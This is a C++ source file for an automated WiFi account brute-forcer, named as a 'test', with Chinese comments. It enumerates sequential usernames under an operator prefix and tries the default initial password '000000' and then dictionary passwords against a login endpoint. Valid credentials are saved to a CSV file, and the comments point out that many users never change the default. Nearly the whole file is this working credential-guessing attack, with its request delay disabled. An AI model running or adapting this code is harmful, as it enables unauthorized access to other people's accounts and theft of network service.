﻿/**
 * @file CCDX_WIFI_TEST.cpp
 * @date 20.03.2024
 * @author RMSHE
 *
 * < GasSensorOS >
 * Copyright(C) 2024 RMSHE. All rights reserved.
 *
 * This program is free software : you can redistribute it and /or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.If not, see < https://www.gnu.org/licenses/>.
 *
 * Electronic Mail : asdfghjkl851@outlook.com
 */

#include <iostream>
#include "WebRequests.hpp"
#include "UsernameGenerator.hpp"

CSV_Operations csv_op;

/**
 * WIFI_Test 类用于测试和记录WIFI账户的有效性。
 * 它尝试连接到WIFI账户，使用预定义(默认)参数或提供参数进行尝试。
 */
class WIFI_Test {
private:
    //用户名列表的生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式;)
    std::string gen_mode;

    // 用户名列表的生成时在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
    uint64_t maxDecrement;

    // 尝试的用户名数量(生成用户名的数量)
    uint16_t amount;

    // 用户名尝试范围(最小最大值,运营商注册的账号有数字递增的特点,因此根据已知的两个有效用户名顺序生成中间用户名是一个简洁有效的方法)
    uint64_t minNum, maxNum;

    // 密码尝试次数(从密码字典中抽取密码进行尝试的次数)
    uint32_t pwdTryNum;

    // 用户名前缀(取决于运营商)
    std::string usernamePrefix;

    // 账户初始密码(取决于运营商,值得一试!)
    std::string initialPassword;

public:
    // 构造函数: 初始化测试参数
    WIFI_Test(std::string gen_mode = "s",                       // 用户名列表生成模式
              uint32_t pwdTryNum = 100,                         // 密码尝试次数
              const uint16_t amount = 1000,                     // 需生成的用户名数量
              const uint64_t minNum = 8143086109,               // 用户名尝试范围的最小值
              const uint64_t maxNum = 9975813272,               // 用户名尝试范围的最大值
              uint64_t maxDecrement = 8,                        // 生成用户名时随机递减值的最大限度
              const std::string &usernamePrefix = "043111",     // 用户名前缀
              const std::string &initialPassword = "000000") :  // 账户的初始密码
        gen_mode(gen_mode),
        pwdTryNum(pwdTryNum),
        amount(amount),
        minNum(minNum),
        maxNum(maxNum),
        maxDecrement(maxDecrement),
        usernamePrefix(usernamePrefix),
        initialPassword(initialPassword) {}

    // 开始执行WIFI账户的有效性测试。
    void runTests() {
        UsernameGenerator ug(amount, minNum, maxNum, usernamePrefix);

        /**
         * 生成用户名列表;
         * @param gen_mode 生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式;)
         * @param maxDecrement 在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
         */
        ug.generateUsernamesList(gen_mode, maxDecrement);

        // 读取密码字典;
        dic.readDictionary();

        // 读取无效账号信息;
        dic.readInvalidAccounts();

        // 获取有效账户的数目
        effectiveAccountAmount = dic.getEffectiveAccountAmount();

        while (true) {
            // 从用户名列表中抽取用户名
            currentUsername = ug.extractUniqueUsernam();

            // 如果用户名已被全部抽取完,则结束循环
            if (currentUsername == "") break;

            system("CLS");
            std::cout << "正在尝试第 " << ++usernameNum << " 个用户名, " <<
                "共找到 " << effectiveAccountNum << "/" << effectiveAccountNum + effectiveAccountAmount << " 个有效账户.\n" << std::endl;

            // 设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!)
            currentPassword = initialPassword;

            // 重置字典;
            dic.copyPasswordDictionary();

            for (uint32_t i = 0; i < pwdTryNum; ++i) {
                // 检查并跳过已知的无效密码, 若为无效密码则直接(跳过本次循环)跳过无效密码, 避免重复测试.
                if (dic.isInvalidAccountsExists(currentUsername, currentPassword) == true) {
                    // 从密码字典中抽取密码
                    currentPassword = dic.extractUniquePassword();

                    // 如果密码已被全部抽取完,则结束循环
                    if (currentPassword == "") break;

                    continue;// 跳过当前循环的剩余部分
                }

                std::cout << "\r当前用户名(" << usernameNum << "/" << amount << "):" << currentUsername <<
                    "\t当前密码(" << i << "/" << pwdTryNum << "):" << currentPassword << "                ";

                WebRequests re(currentUsername, currentPassword);

                auto respond = re.login();

                if (respond[0].first == "result" && respond[0].second == "true") {
                    // 登录成功，保存有效账户信息到CSV文件
                    csv_op.writeToCSV({ { currentUsername , currentPassword } }, "./EffectiveAccount.csv");

                    // 增加有效账户计数
                    ++effectiveAccountNum;
                    break;
                } else {
                    // 登录失败, 记录对应用户名的无效密码;
                    dic.addInvalidAccount(currentUsername, currentPassword);
                }

                // 从密码字典中抽取密码
                currentPassword = dic.extractUniquePassword();

                // 如果密码已被全部抽取完,则结束循环
                if (currentPassword == "") break;

                // 随机延时;
                // tl.randomDelay(500, 1000);
            }

            // 将无效账户（用户名和密码集合）保存到CSV文件中。
            dic.saveInvalidAccounts();
        }
    }

private:
    uint32_t usernameNum = 0;                       // 用于记录已经尝试过的用户名数目;
    uint32_t effectiveAccountNum = 0;               // 用于记录有效账户数;
    std::string currentUsername, currentPassword;   // 当前正在尝试的用户名和密码;
    uint32_t effectiveAccountAmount;                // 保存在EffectiveAccount.csv文件中的已验证的有效账户数目;
};

int main() {
    tl.displayInfo();       // 显示版本信息

    //tl.displayDictionary(); // 显示字典内容

    WIFI_Test test;     // 初始化测试参数

    test.runTests();    // 运行测试

    system("pause");
    return 0;
}

/*

// CSV文件"创建-写-读-删除-存在性"测试;

std::vector<std::vector<std::string>> Invalid_Username;
for (int i = 0; i < 100; ++i) {
    Invalid_Username.push_back({ ug.randomGenerate() ,{ std::to_string(i) } });
}

csv_op.appendToCSV(Invalid_Username, "./Invalid_Username.csv");
std::vector<std::vector<std::string>> data = csv_op.readFromCSV("./Invalid_Username.csv");

for (auto &i : data) {
    for (auto &j : i) {
        std::cout << j << "\t";
    }
    std::cout << "\n";
}

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

csv_op.deletePath("./Invalid_Username.csv");

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

*/

/*

// 密码字典"读取-拷贝-随机化-抽取"测试;
for (auto &i : dic.readDictionary("./Dictionary.csv")) {
    std::cout << i << std::endl;
}

std::cout << "------------------------" << std::endl;

while (true) {
    std::string pwd = dic.extractUniquePassword();
    std::cout << pwd << std::endl;

    if (pwd == "")break;
}

*/

/*

// 用户名"生成-拷贝-抽取"测试;
// 生成用户名列表;
ug.generateUsernamesList("s");

while (true) {
    std::string use = ug.extractUniqueUsernam();
    std::cout << use << std::endl;

    if (use == "")break;
}

*/